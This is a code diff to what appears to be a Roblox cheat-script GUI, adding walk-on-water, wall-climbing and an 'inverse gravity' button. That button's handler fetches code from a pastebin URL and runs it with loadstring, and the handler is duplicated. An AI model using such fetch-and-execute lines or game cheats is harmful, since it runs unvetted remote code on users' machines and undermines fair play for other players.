@@ -563,7 +563,7 @@ Startwalingonawaterbutton.MouseButton1Click:Connect(function()
 
 	brick = Instance.new("Part")
 	brick.Name = "SpawnedBrick"
-	brick.Size = Vector3.new(10000, 0.10000000149011612, 10000)
+	brick.Size = Vector3.new(100000, 0.10000000149011612, 100000)
 	brick.Position = Vector3.new(0, 14, 0)
 	brick.Anchored = true
 
@@ -598,3 +598,104 @@ Stopwalingonawaterbutton.MouseButton1Click:Connect(function()
 		brick = nil
 	end
 end)
+
+inversegravityguibutton.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/96XzjEiK"))()
+end)
+
+inversegravityguibutton.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/96XzjEiK"))()
+end)
+
+
+--climbing on a walls
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+------------------------------------------------
+-- CHARACTER HANDLING
+------------------------------------------------
+local character, humanoid, root, animator
+
+local function setupCharacter(char)
+	character = char
+	humanoid = char:WaitForChild("Humanoid")
+	root = char:WaitForChild("HumanoidRootPart")
+
+	animator = humanoid:FindFirstChildOfClass("Animator")
+	if not animator then
+		animator = Instance.new("Animator", humanoid)
+	end
+end
+
+setupCharacter(player.Character or player.CharacterAdded:Wait())
+player.CharacterAdded:Connect(setupCharacter)
+
+local enabled = false
+local climbing = false
+local track = nil
+
+local climbAnim = Instance.new("Animation")
+climbAnim.AnimationId = "rbxassetid://507765644"
+
+local function loadAnimation()
+	if track then
+		track:Stop()
+		track:Destroy()
+	end
+	track = animator:LoadAnimation(climbAnim)
+end
+
+Startclambingonawallsbutton.MouseButton1Click:Connect(function()
+	if enabled then return end
+	enabled = true
+	loadAnimation()
+end)
+
+Stopclambingonawallsbutton.MouseButton1Click:Connect(function()
+	enabled = false
+	climbing = false
+	if track then track:Stop() end
+end)
+
+RunService.RenderStepped:Connect(function()
+	if not enabled or not root then
+		return
+	end
+
+	local params = RaycastParams.new()
+	params.FilterDescendantsInstances = {character}
+	params.FilterType = Enum.RaycastFilterType.Blacklist
+
+	local hit = workspace:Raycast(
+		root.Position,
+		root.CFrame.LookVector * 2,
+		params
+	)
+
+	if hit then
+		if not climbing then
+			climbing = true
+			if track then track:Play() end
+		end
+		root.AssemblyLinearVelocity = Vector3.new(0, 14, 0)
+	else
+		if climbing then
+			climbing = false
+			if track then track:Stop() end
+
+			local bv = Instance.new("BodyVelocity")
+			bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+			bv.Velocity = Vector3.new(0, 25, 0)
+			bv.Parent = root
+
+			task.delay(0.1, function()
+				if bv then bv:Destroy() end
+			end)
+		end
+	end
+end)
+
+--climbing on a walls
